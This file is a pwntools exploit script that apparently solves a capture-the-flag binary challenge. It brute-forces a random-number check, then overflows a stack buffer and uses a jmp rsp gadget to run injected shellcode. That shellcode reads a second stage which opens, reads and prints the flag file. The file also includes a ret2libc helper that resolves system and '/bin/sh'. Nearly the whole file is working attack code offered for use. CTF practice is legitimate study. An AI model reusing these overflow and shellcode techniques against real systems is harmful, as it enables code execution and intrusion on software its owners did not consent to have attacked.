#!/usr/bin/python3
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *
from sys import argv

local = 1
if 'r' in argv:	local = 0
os_level = 64
binary_name = 'RANDOM'
remote_addr, port = 'node5.anna.nssctf.cn:21575'.split(':')

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    # libc = e.libc
else:
    log.warning('!!REMOTE!!')
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)
    # libc = ELF('libc-2.23.so')

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
display = lambda name,addr: log.success('{}--> {:#x}'.format(name,addr))
slp = lambda x: sleep(x)

def dbg():
    if local:
        gdb.attach(p)
        pause()
    else:
        pass

def ret2libc(leak,func,path=''):
    if path == '':
        libc = LibcSearcher(func,leak)
        base = leak - libc.dump(func)
        system = base + libc.dump('system')
        bin_sh = base + libc.dump('str_bin_sh')

    else:
        libc = ELF(path)
        base = leak - libc.dump(func)
        system = base + libc.dump('system')
        bin_sh = base + libc.dump('str_bin_sh').next()

    return (system, bin_sh)

#Main function
if __name__ == '__main__':
    #you can add your code here
    flag = False
    date_base = 0x601000
    jmp_rsp = 0x40094E
    for _ in range(100):
        sla('num:\n','25')
        tmp = rl()
        if tmp == b'no,no,no\n':
            continue
        else:
            flag = True
            break
    if not flag:
        p.close()
        exit()
    payload = asm(shellcraft.read(0,date_base,0x100))
    payload += asm('mov rax, 0x601000; call rax')
    payload = payload.ljust(0x20,b'a') + b'b'*0x8 + p64(jmp_rsp)
    payload += asm('sub rsp, 0x30; jmp rsp')
    #dbg()
    sla('door\n',payload)
    orw = asm(shellcraft.open('./flag'))
    orw += asm(shellcraft.read(3, date_base + 0x100, 0x30))
    orw += asm(shellcraft.write(1, date_base + 0x100, 0x30))
    sl(orw)
    p.interactive()